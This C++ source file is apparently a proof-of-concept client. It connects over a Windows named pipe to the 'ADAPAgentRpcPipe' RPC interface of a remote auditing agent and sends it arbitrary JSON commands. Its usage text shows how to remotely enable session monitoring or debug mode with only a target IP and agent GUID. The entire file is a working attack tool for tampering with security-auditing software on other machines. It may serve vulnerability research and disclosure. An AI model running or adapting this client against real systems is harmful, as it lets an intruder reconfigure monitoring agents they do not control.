/* file: adauditrpc-client.cpp */
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include "ADAPAgentRpcPipe_h.h"
#include <windows.h>
#pragma comment(lib, "rpcrt4.lib")
#include <iostream>

int wmain(int argc, wchar_t* argv[])
{
    if (argc < 5) {
        wprintf(L"Usage: %ls <IP> <AgentGUID> <case> <inputdata>\n", argv[0]);
        wprintf(L"Example - Enable SessionMonitoring: %ls 127.0.0.1 \"1699964702085\" 0 \'\"\"\"SMData\"\"\":{\"\"\"SMStatus\"\"\":\"\"\"True\"\"\"}\'\n", argv[0]);
        wprintf(L"Example - Enable Debug: %ls 127.0.0.1 \"1699964702085\" 8 \'\"\"\"ENABLE_DEBUG\"\"\":true\'\n", argv[0]);
        return 1;
    }

    const wchar_t* ip = argv[1];
    RPC_WSTR NetworkAddress = (RPC_WSTR)ip;
    printf("[+] Accessing ADAPAgentRpcPipe named pipe on: %ls\n", ip);

    const wchar_t* agentuid = argv[2];
    printf("[+] Using AgentUID: %ls\n", agentuid);

    long arg_0 = std::wcstol(argv[3], nullptr, 10);
    printf("[+] Case: %i\n", arg_0);

    const wchar_t* inputdata = argv[4];
    wchar_t str1[256] = L"{\"AgentUID\":\""; // Make sure the array is large enough
    wcscat_s(str1, agentuid); // Concatenates str1 and agentuid
    wcscat_s(str1, L"\","); // Concatenates str1 and ,
    wcscat_s(str1, inputdata); // Concatenates str1 and inputdata
    wcscat_s(str1, L"}"); // Concatenates str1 with }"
    wprintf(L"[+] InputData: %ls\n", str1);

    RPC_STATUS status;
    RPC_WSTR pszUuid = NULL;
    RPC_WSTR pszProtocolSequence = (RPC_WSTR)L"ncacn_np";
    //RPC_WSTR pszNetworkAddress = (RPC_WSTR)L"100.64.5.212";
    RPC_WSTR pszNetworkAddress = NetworkAddress;
    RPC_WSTR pszEndpoint = (RPC_WSTR)L"\\pipe\\ADAPAgentRpcPipe";
    RPC_WSTR pszOptions = NULL;
    RPC_WSTR pszStringBinding = NULL;
    //unsigned char * pszString           = "hello, world";
    unsigned long ulCode;

    status = RpcStringBindingCompose(pszUuid,
        pszProtocolSequence,
        pszNetworkAddress,
        pszEndpoint,
        pszOptions,
        &pszStringBinding);
    if (status) exit(status);

    status = RpcBindingFromStringBinding(pszStringBinding, &DefaultIfName_v1_0_c_ifspec);

    if (status) exit(status);

    long arg2_pointer;
    long* arg_2 = &arg2_pointer;
    RpcTryExcept
    {
        Proc1(DefaultIfName_v1_0_c_ifspec, arg_0, str1, arg_2);
    }
        RpcExcept(1)
    {
        ulCode = RpcExceptionCode();
        printf("Runtime reported exception 0x%lx = %ld\n", ulCode, ulCode);
    }
    RpcEndExcept

        status = RpcStringFree(&pszStringBinding);

    if (status) exit(status);

    status = RpcBindingFree(&DefaultIfName_v1_0_c_ifspec);

    if (status) exit(status);

    exit(0);
}

/******************************************************/
/*         MIDL allocate and free                     */
/******************************************************/

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
    return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
    free(ptr);
}
